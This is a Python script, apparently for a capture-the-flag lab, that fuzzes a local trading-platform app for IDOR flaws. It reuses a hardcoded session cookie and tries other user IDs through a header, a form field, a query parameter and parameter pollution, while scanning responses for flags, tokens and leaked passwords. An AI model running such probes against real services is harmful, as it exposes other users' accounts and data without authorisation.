import requests
import re

# Target configuration
BASE_URL = "http://127.0.0.1:33029"
SESSION_COOKIE = "eyJ1c2VyX2lkIjoxMDAzMn0.ac6Z5w.L4Dx_bmHgYdRTXc80ol3P3GoeoY"

# Set up session with existing cookie
session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)

# Test ID values - adjacent values and edge cases
test_ids = [
    # Adjacent values (┬▒5 from 10032)
    10027, 10028, 10029, 10030, 10031,  # Below current user
    10033, 10034, 10035, 10036, 10037,  # Above current user
    # Extended range
    10000, 10010, 10020, 10040, 10050, 10060,
    # Edge cases
    0, 1, -1, 99999, 100, 1000,
]

print("=" * 80)
print("IDOR FUZZING CAMPAIGN - Trading Platform")
print(f"Base URL: {BASE_URL}")
print(f"Authenticated as user_id: 10032 (test)")
print("=" * 80)

# First, get baseline authenticated response
print("\n[BASELINE] Getting current user dashboard...")
baseline_resp = session.get(f"{BASE_URL}/dashboard")
print(f"Status: {baseline_resp.status_code}")
print(f"Response length: {len(baseline_resp.text)} bytes")
baseline_user = re.search(r'(user_id|User ID|userId)["\']?\s*[:=]\s*["\']?(\d+)', baseline_resp.text, re.I)
if baseline_user:
    print(f"Detected user ID in page: {baseline_user.group(2)}")
baseline_name = re.search(r'(John Doe|username|name)["\']?\s*[:=]\s*["\']?([^"\'<]+)', baseline_resp.text, re.I)
if baseline_name:
    print(f"Detected name in page: {baseline_name.group(2)[:50]}")

# Check for FLAG in baseline
if "FLAG{" in baseline_resp.text:
    print("[!] FLAG FOUND IN BASELINE RESPONSE!")
    print(baseline_resp.text)

print("\n" + "=" * 80)
print("TEST VECTOR 1: X-UserId Header on /dashboard")
print("=" * 80)

for test_id in test_ids:
    headers = {"X-UserId": str(test_id)}
    try:
        resp = session.get(f"{BASE_URL}/dashboard", headers=headers, timeout=10)
        
        # Check for FLAG
        if "FLAG{" in resp.text:
            print(f"\n[!] FLAG FOUND with X-UserId={test_id}!")
            print(f"Status: {resp.status_code}")
            print(f"Response:\n{resp.text}")
            continue
        
        # Check for different user data
        user_match = re.search(r'(user_id|User ID|userId)["\']?\s*[:=]\s*["\']?(\d+)', resp.text, re.I)
        name_match = re.search(r'(username|name|display)["\']?\s*[:=]\s*["\']?([^"\'<\s]+)', resp.text, re.I)
        
        current_user = user_match.group(2) if user_match else "unknown"
        current_name = name_match.group(2) if name_match else "unknown"
        
        # Report any anomalies
        if current_user != "10032" and current_user != "unknown":
            print(f"\n[ANOMALY] X-UserId={test_id} -> user_id={current_user}, name={current_name}")
            print(f"Status: {resp.status_code} | Length: {len(resp.text)}")
        elif resp.status_code != 200:
            print(f"[STATUS] X-UserId={test_id} -> Status {resp.status_code}")
            
    except Exception as e:
        print(f"[ERROR] X-UserId={test_id}: {e}")

print("\n" + "=" * 80)
print("TEST VECTOR 2: Form field user_id on POST /password/test")
print("=" * 80)

for test_id in test_ids:
    data = {"user_id": str(test_id)}
    try:
        resp = session.post(f"{BASE_URL}/password/test", data=data, timeout=10, allow_redirects=True)
        
        # Check for FLAG
        if "FLAG{" in resp.text:
            print(f"\n[!] FLAG FOUND with user_id={test_id}!")
            print(f"Status: {resp.status_code}")
            print(f"Response:\n{resp.text}")
            continue
        
        # Check for different user data
        user_match = re.search(r'(user_id|User ID|userId)["\']?\s*[:=]\s*["\']?(\d+)', resp.text, re.I)
        name_match = re.search(r'(John Doe|username|name)["\']?\s*[:=]\s*["\']?([^"\'<]+)', resp.text, re.I)
        
        current_user = user_match.group(2) if user_match else "unknown"
        current_name = name_match.group(2) if name_match else "unknown"
        
        if current_user != "10032" and current_user != "unknown":
            print(f"\n[ANOMALY] POST user_id={test_id} -> user_id={current_user}, name={current_name}")
            print(f"Status: {resp.status_code} | Length: {len(resp.text)}")
            print(f"URL after redirect: {resp.url}")
        elif resp.status_code != 200 and resp.status_code != 302:
            print(f"[STATUS] POST user_id={test_id} -> Status {resp.status_code}")
            
    except Exception as e:
        print(f"[ERROR] POST user_id={test_id}: {e}")

print("\n" + "=" * 80)
print("TEST VECTOR 3: Query parameter user_id on GET /dashboard")
print("=" * 80)

for test_id in test_ids:
    try:
        resp = session.get(f"{BASE_URL}/dashboard?user_id={test_id}", timeout=10)
        
        # Check for FLAG
        if "FLAG{" in resp.text:
            print(f"\n[!] FLAG FOUND with query user_id={test_id}!")
            print(f"Status: {resp.status_code}")
            print(f"Response:\n{resp.text}")
            continue
        
        user_match = re.search(r'(user_id|User ID|userId)["\']?\s*[:=]\s*["\']?(\d+)', resp.text, re.I)
        if user_match:
            current_user = user_match.group(2)
            if current_user != "10032":
                print(f"\n[ANOMALY] Query user_id={test_id} -> page shows user_id={current_user}")
                
    except Exception as e:
        print(f"[ERROR] Query user_id={test_id}: {e}")

print("\n" + "=" * 80)
print("TEST VECTOR 4: HTTP Parameter Pollution - Multiple user_id values")
print("=" * 80)

pollution_payloads = [
    (10032, 10033),  # First valid, second target
    (10033, 10032),  # First target, second valid
    (10033, 10034),  # Both different
]

for first_id, second_id in pollution_payloads:
    try:
        resp = session.get(f"{BASE_URL}/dashboard?user_id={first_id}&user_id={second_id}", timeout=10)
        
        if "FLAG{" in resp.text:
            print(f"\n[!] FLAG FOUND with pollution ({first_id}, {second_id})!")
            print(resp.text)
            
        user_match = re.search(r'(user_id|User ID|userId)["\']?\s*[:=]\s*["\']?(\d+)', resp.text, re.I)
        if user_match:
            current_user = user_match.group(2)
            print(f"Pollution ({first_id},{second_id}) -> Shows user: {current_user}")
            
    except Exception as e:
        print(f"[ERROR] Pollution ({first_id},{second_id}): {e}")

print("\n" + "=" * 80)
print("TEST VECTOR 5: Check /files/upload endpoint")
print("=" * 80)

try:
    upload_get = session.get(f"{BASE_URL}/files/upload", timeout=10)
    print(f"GET /files/upload: Status {upload_get.status_code}")
    if upload_get.status_code == 200:
        print(f"Response length: {len(upload_get.text)} bytes")
        # Look for forms, user_id fields
        if "user_id" in upload_get.text.lower():
            print("[INFO] Found user_id field in upload form")
            print(upload_get.text[:1000])
except Exception as e:
    print(f"[ERROR] /files/upload GET: {e}")

print("\n" + "=" * 80)
print("FUZZING SUMMARY")
print("=" * 80)
print(f"Tested {len(test_ids)} ID values across multiple vectors")
print("Checking for any remaining indicators...")

# Final comprehensive check - search all responses for flags and interesting patterns
print("\nScanning baseline for hidden patterns...")
hidden_patterns = [
    r'FLAG\{[^}]+\}',
    r'flag\{[^}]+\}',
    r'TRADE\{[^}]+\}',
    r'[A-Z0-9]{20,}',  # Potential tokens
    r'password["\']?\s*[:=]\s*["\']?[^"\'\s]+',  # Password leaks
]

for pattern in hidden_patterns:
    matches = re.findall(pattern, baseline_resp.text, re.I)
    if matches:
        print(f"Pattern '{pattern}' found: {matches[:5]}")

print("\n[IDOR FUZZING COMPLETE]")

